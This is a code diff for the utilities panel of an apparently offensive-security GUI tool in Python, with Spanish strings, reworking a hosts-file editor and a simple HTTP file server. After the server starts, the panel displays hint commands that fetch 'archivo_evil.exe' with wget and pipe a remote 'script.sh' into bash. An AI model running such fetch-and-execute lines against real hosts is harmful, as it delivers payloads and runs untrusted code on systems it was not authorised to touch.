@@ -77,29 +77,52 @@ class UtilsPanel(ctk.CTkFrame):
 
 
     def add_to_hosts(self):
-        ip = self.app.panels["scanner"].entry_ip.get()
-        domain = self.domain_entry.get()
+        ip = self.app.panels["scanner"].entry_ip.get().strip()
+        domain = self.domain_entry.get().strip()
+        
         if not ip or not domain:
-            return
-        if not self._valid_ip(ip) or not self._valid_domain(domain):
-            Toast(self.app, "IP o dominio inválido", self.app.c)
+            Toast(self.app, "[❌] IP y dominio requeridos", self.app.c)
             if self.app.logger:
-                self.app.logger.warn("IP o dominio inválido para hosts", tag="UTILS")
+                self.app.logger.utils("[❌] Falta IP o dominio para hosts")
             return
+        
+        if not self._valid_ip(ip):
+            Toast(self.app, "[❌] IP inválida (formato: xxx.xxx.xxx.xxx)", self.app.c)
+            if self.app.logger:
+                self.app.logger.utils(f"[❌] IP inválida: {ip}")
+            return
+        
+        if not self._valid_domain(domain):
+            Toast(self.app, "[❌] Dominio inválido", self.app.c)
+            if self.app.logger:
+                self.app.logger.utils(f"[❌] Dominio inválido: {domain}")
+            return
+        
         try:
+            if self.app.logger:
+                self.app.logger.utils(f"[⏳] Añadiendo {domain} -> {ip} a hosts...")
+            
             ruta = append_hosts_entry(ip, domain)
-            self.http_status.configure(text=f"Añadido {domain} -> {ip}", text_color=self.app.c["TEXT_SUCCESS"])
+            self.http_status.configure(text=f"✅ Añadido {domain} -> {ip}", text_color=self.app.c["TEXT_SUCCESS"])
+            Toast(self.app, f"[✅] {domain} añadido a hosts", self.app.c)
+            
             if self.app.logger:
-                self.app.logger.utils(f"Hosts actualizado: {domain} -> {ip}")
-        except PermissionError:
+                self.app.logger.utils(f"[✅] Hosts actualizado: {domain} -> {ip}")
+            
+            self.domain_entry.delete(0, "end")
+        except PermissionError as e:
             ruta = resolve_hosts_path()
-            self.http_status.configure(text=f"Permisos insuficientes para {ruta}", text_color=self.app.c["TEXT_DANGER"])
+            msg = f"[❌] Permisos insuficientes para {ruta}"
+            self.http_status.configure(text=msg, text_color=self.app.c["TEXT_DANGER"])
+            Toast(self.app, msg, self.app.c)
             if self.app.logger:
-                self.app.logger.error(f"Permisos insuficientes para {ruta}", tag="UTILS")
+                self.app.logger.utils(msg)
         except Exception as e:
-            self.http_status.configure(text=f"Error: {e}", text_color=self.app.c["TEXT_DANGER"])
+            msg = f"[❌] Error: {e}"
+            self.http_status.configure(text=msg, text_color=self.app.c["TEXT_DANGER"])
+            Toast(self.app, msg, self.app.c)
             if self.app.logger:
-                self.app.logger.error(f"Error hosts: {e}", tag="UTILS")
+                self.app.logger.utils(msg)
 
     def _valid_ip(self, ip):
         return bool(re.fullmatch(r"\d{1,3}(?:\.\d{1,3}){3}", ip))
@@ -110,25 +133,48 @@ class UtilsPanel(ctk.CTkFrame):
 
     def choose_directory(self):
         from tkinter import filedialog
-        folder = filedialog.askdirectory()
-        if folder:
+        try:
+            folder = filedialog.askdirectory(title="Selecciona carpeta para servidor HTTP")
+            if not folder:
+                if self.app.logger:
+                    self.app.logger.utils("[⚠️] Selección de carpeta cancelada")
+                return
+            
+            if not os.path.isdir(folder):
+                Toast(self.app, "[❌] Carpeta no existe", self.app.c)
+                return
+            
             self.selected_folder = folder
             self.app.context.http_server_path = folder
-            self.http_status.configure(text=f"Sirviendo: {os.path.basename(folder)}", text_color=self.app.c["TEXT_PRIMARY"])
+            self.http_status.configure(text=f"📂 Sirviendo: {os.path.basename(folder)}", text_color=self.app.c["TEXT_PRIMARY"])
+            
             if self.app.logger:
-                self.app.logger.server(f"Directorio seleccionado: {folder}")
+                self.app.logger.utils(f"[✅] Directorio seleccionado: {folder}")
+        except Exception as e:
+            if self.app.logger:
+                self.app.logger.utils(f"[❌] Error seleccionando carpeta: {e}")
 
     def start_http_server(self):
         if self.httpd is not None:
+            Toast(self.app, "[⚠️] Servidor ya está corriendo", self.app.c)
             return
-        port_text = self.http_port_entry.get() or "8000"
+        
+        port_text = self.http_port_entry.get().strip() or "8000"
         try:
             port = int(port_text)
+            if not (1 <= port <= 65535):
+                Toast(self.app, "[❌] Puerto debe estar entre 1 y 65535", self.app.c)
+                self.http_status.configure(text="[❌] Puerto fuera de rango", text_color=self.app.c["TEXT_WARNING"])
+                if self.app.logger:
+                    self.app.logger.utils("[❌] Puerto fuera de rango")
+                return
         except ValueError:
-            self.http_status.configure(text="Puerto inválido.", text_color=self.app.c["TEXT_WARNING"])
+            Toast(self.app, "[❌] Puerto debe ser un número válido", self.app.c)
+            self.http_status.configure(text="[❌] Puerto inválido", text_color=self.app.c["TEXT_WARNING"])
             if self.app.logger:
-                self.app.logger.warn("Puerto inválido para HTTP server", tag="SERVER")
+                self.app.logger.utils(f"[❌] Puerto inválido: {port_text}")
             return
+        
         self.app.context.http_server_path = self.selected_folder
 
         class GUIRequestHandler(http.server.SimpleHTTPRequestHandler):
@@ -142,50 +188,83 @@ class UtilsPanel(ctk.CTkFrame):
 
         handler = functools.partial(GUIRequestHandler, directory=self.selected_folder)
         try:
+            if self.app.logger:
+                self.app.logger.utils(f"[⏳] Iniciando servidor en puerto {port}...")
+            
             self.httpd = socketserver.TCPServer(("", port), handler)
+            self.httpd.allow_reuse_address = True
         except OSError as e:
-            self.http_status.configure(text=f"Error puerto: {e.strerror}", text_color=self.app.c["TEXT_DANGER"])
+            msg = f"[❌] Error en puerto {port}: {e.strerror}"
+            self.http_status.configure(text=msg, text_color=self.app.c["TEXT_DANGER"])
+            Toast(self.app, msg, self.app.c)
             self.httpd = None
             if self.app.logger:
-                self.app.logger.error(f"Error puerto: {e.strerror}", tag="SERVER")
+                self.app.logger.utils(msg)
             return
 
         def serve():
             try:
                 self.httpd.serve_forever()
-            except Exception:
-                pass
+            except Exception as e:
+                if self.app.logger:
+                    self.app.logger.utils(f"[❌] Error en servidor: {e}")
 
         self.http_thread = threading.Thread(target=serve, daemon=True)
         self.http_thread.start()
         self.btn_http_start.configure(state="disabled")
         self.btn_http_stop.configure(state="normal")
         self.btn_folder.configure(state="disabled")
-        self.http_status.configure(text=f"ON | Port {port} | Dir: .../{os.path.basename(self.selected_folder)}", text_color=self.app.c["TEXT_SUCCESS"])
+        
+        self.http_status.configure(
+            text=f"✅ ON | Puerto {port} | Dir: .../{os.path.basename(self.selected_folder)}", 
+            text_color=self.app.c["TEXT_SUCCESS"]
+        )
 
         if self.app.logger:
-            self.app.logger.server(f"Servidor HTTP iniciado en {port} | Dir: {self.selected_folder}")
+            self.app.logger.utils(f"[✅] Servidor HTTP iniciado en puerto {port}")
+            self.app.logger.utils(f"[📁] Sirviendo: {self.selected_folder}")
 
         local_ip = self.app.obtener_ip_local()
         self.download_hint.configure(state="normal")
         self.download_hint.delete("1.0", "end")
-        self.download_hint.insert("end", f"wget http://{local_ip}:{port}/archivo_evil.exe\ncurl http://{local_ip}:{port}/script.sh | bash")
+        self.download_hint.insert("end", f"🔗 Descargas rápidas:\n")
+        self.download_hint.insert("end", f"  wget http://{local_ip}:{port}/archivo_evil.exe\n")
+        self.download_hint.insert("end", f"  curl http://{local_ip}:{port}/script.sh | bash")
         self.download_hint.configure(state="disabled")
+        
+        Toast(self.app, f"[✅] Servidor corriendo en puerto {port}", self.app.c)
 
     def write_http_log(self, msg):
-        self.http_log_box.insert("end", msg)
-        self.http_log_box.see("end")
+        try:
+            if self.http_log_box.winfo_exists():
+                self.http_log_box.insert("end", msg)
+                self.http_log_box.see("end")
+        except Exception:
+            pass
 
     def stop_http_server(self):
         if self.httpd is None:
+            Toast(self.app, "[⚠️] Servidor no está corriendo", self.app.c)
             return
-        self.httpd.shutdown()
-        self.httpd.server_close()
-        self.httpd = None
-        self.http_thread = None
-        self.btn_http_start.configure(state="normal")
-        self.btn_http_stop.configure(state="disabled")
-        self.btn_folder.configure(state="normal")
-        self.http_status.configure(text="Server detenido.", text_color=self.app.c["TEXT_MUTED"])
-        if self.app.logger:
-            self.app.logger.server("Servidor HTTP detenido")
+        
+        try:
+            if self.app.logger:
+                self.app.logger.utils("[⏳] Deteniendo servidor HTTP...")
+            
+            self.httpd.shutdown()
+            self.httpd.server_close()
+            self.httpd = None
+            self.http_thread = None
+            self.btn_http_start.configure(state="normal")
+            self.btn_http_stop.configure(state="disabled")
+            self.btn_folder.configure(state="normal")
+            self.http_status.configure(text="⛔ Server detenido", text_color=self.app.c["TEXT_MUTED"])
+            
+            Toast(self.app, "[✅] Servidor detenido", self.app.c)
+            if self.app.logger:
+                self.app.logger.utils("[✅] Servidor HTTP detenido")
+        except Exception as e:
+            msg = f"[❌] Error al detener servidor: {e}"
+            self.http_status.configure(text=msg, text_color=self.app.c["TEXT_DANGER"])
+            if self.app.logger:
+                self.app.logger.utils(msg)
